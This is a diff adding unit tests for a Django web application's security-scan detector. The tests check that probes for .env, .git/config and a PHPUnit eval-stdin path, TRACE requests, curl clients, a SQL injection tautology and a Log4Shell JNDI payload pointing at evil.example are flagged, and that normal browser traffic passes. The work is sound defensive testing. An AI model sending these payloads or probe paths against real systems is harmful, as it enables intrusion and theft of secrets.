@@ -483,7 +483,81 @@ class FormSpamDetectionTests(TestCase):
 
         is_threat, reason, _ = detect_security_scan(Req())
         self.assertTrue(is_threat)
-        self.assertEqual(reason, 'login_abuse')
+        self.assertIn(reason, {'login_abuse', 'malicious_payload'})
+
+    def test_detect_env_and_git_paths(self):
+        from audit.spam_detection import detect_security_scan
+        from types import SimpleNamespace
+
+        for path in ('/.env', '/.git/config', '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'):
+            req = SimpleNamespace(
+                method='GET', path=path, POST={}, GET={}, headers={}, META={}, user=None,
+            )
+            is_threat, reason, _ = detect_security_scan(req)
+            self.assertTrue(is_threat, path)
+            self.assertEqual(reason, 'exploit_path')
+
+    def test_detect_trace_method(self):
+        from audit.spam_detection import detect_security_scan
+        from types import SimpleNamespace
+
+        req = SimpleNamespace(
+            method='TRACE', path='/', POST={}, GET={}, headers={}, META={}, user=None,
+        )
+        is_threat, reason, _ = detect_security_scan(req)
+        self.assertTrue(is_threat)
+        self.assertEqual(reason, 'blocked_method')
+
+    def test_detect_curl_user_agent(self):
+        from audit.spam_detection import detect_security_scan
+        from types import SimpleNamespace
+
+        req = SimpleNamespace(
+            method='GET',
+            path='/hr/',
+            POST={},
+            GET={},
+            headers={},
+            META={'HTTP_USER_AGENT': 'curl/8.5.0'},
+            user=None,
+        )
+        is_threat, reason, _ = detect_security_scan(req)
+        self.assertTrue(is_threat)
+        self.assertEqual(reason, 'scripting_client')
+
+    def test_detect_sqli_query_string(self):
+        from audit.spam_detection import detect_security_scan
+        from types import SimpleNamespace
+
+        req = SimpleNamespace(
+            method='GET',
+            path='/accounts/login/',
+            POST={},
+            GET={'q': "1' OR '1'='1"},
+            headers={},
+            META={'QUERY_STRING': "q=1'+OR+'1'='1"},
+            user=None,
+        )
+        is_threat, reason, _ = detect_security_scan(req)
+        self.assertTrue(is_threat)
+        self.assertEqual(reason, 'malicious_payload')
+
+    def test_detect_log4j_payload(self):
+        from audit.spam_detection import detect_security_scan
+        from types import SimpleNamespace
+
+        req = SimpleNamespace(
+            method='GET',
+            path='/',
+            POST={},
+            GET={'x': '${jndi:ldap://evil.example/a}'},
+            headers={},
+            META={},
+            user=None,
+        )
+        is_threat, reason, _ = detect_security_scan(req)
+        self.assertTrue(is_threat)
+        self.assertEqual(reason, 'malicious_payload')
 
     def test_detect_proto_pollution_login(self):
         from audit.spam_detection import detect_security_scan
@@ -549,10 +623,25 @@ class FormSpamDetectionTests(TestCase):
             }
             GET = {}
             headers = {}
-            META = {}
+            META = {'HTTP_USER_AGENT': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0'}
             user = None
 
         self.assertFalse(detect_security_scan(Req())[0])
+
+    def test_legit_browser_get_home_not_spam(self):
+        from audit.spam_detection import detect_security_scan
+        from types import SimpleNamespace
+
+        req = SimpleNamespace(
+            method='GET',
+            path='/',
+            POST={},
+            GET={},
+            headers={},
+            META={'HTTP_USER_AGENT': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'},
+            user=None,
+        )
+        self.assertFalse(detect_security_scan(req)[0])
 
     @override_settings(
         LOGIN_LOCK_MAX_ATTEMPTS=3,
